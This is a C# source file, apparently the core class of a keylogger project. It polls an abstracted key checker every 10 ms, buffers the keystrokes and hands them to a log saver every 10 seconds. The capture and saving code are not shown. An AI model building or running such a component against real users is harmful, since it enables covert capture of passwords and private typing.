using System.Text;
using System.Timers;
using KeyLogger.Core.Abstract;

namespace KeyLogger.Core
{
    public class KeyLoggerInstance: IKeyLogger
    {
        private readonly StringBuilder logBuffer;
        private readonly StringBuilder reseveBugger;
        private readonly Timer keyCheckTimer;
        private readonly Timer saveLogTimer;

        private bool saving;

        private readonly IKeyChecker keyChecker;
        private readonly ILogSaver logSaver;

        public KeyLoggerInstance(IKeyChecker keyChecker, ILogSaver logSaver,
            long refreshInterval = 10, long saveInterval = 10000) 
        {                                                  
            saving = false;
            logBuffer=new StringBuilder();
            reseveBugger=new StringBuilder();
            this.keyChecker = keyChecker;
            this.logSaver = logSaver;

            keyCheckTimer=new Timer { Interval = refreshInterval };
            saveLogTimer = new Timer { Interval = saveInterval };

            keyCheckTimer.Elapsed += KeyCheckEvent;
            saveLogTimer.Elapsed += SaveLogEvent;
        }

        public void Start()
        {
            if(IsStarted)
            {
                return;
            }
            keyCheckTimer.Enabled = true;
            saveLogTimer.Enabled = true;
        }

        public void Stop()
        {
            if(!IsStarted)
            {
                return;
            }
            keyCheckTimer.Enabled = false;
            saveLogTimer.Enabled = false;
            SaveLog();
        }

        public bool IsStarted { get { return keyCheckTimer.Enabled; } }

        private void SaveLog()
        {
            saving = true;
            if (logSaver.Save(logBuffer.ToString()))
            {
                logBuffer.Clear();
            }

            logBuffer.Append(reseveBugger);
            saving = false;
            reseveBugger.Clear();
        }

        #region events

        private void KeyCheckEvent(object sender, ElapsedEventArgs e)
        {
            if (!saving)
            {
                logBuffer.Append(keyChecker.CheckKeys());
            }
            else
            {
                reseveBugger.Append(keyChecker.CheckKeys());
            }
        }

        private void SaveLogEvent(object sender, ElapsedEventArgs e)
        {
            SaveLog();
        }

        #endregion
    }
}
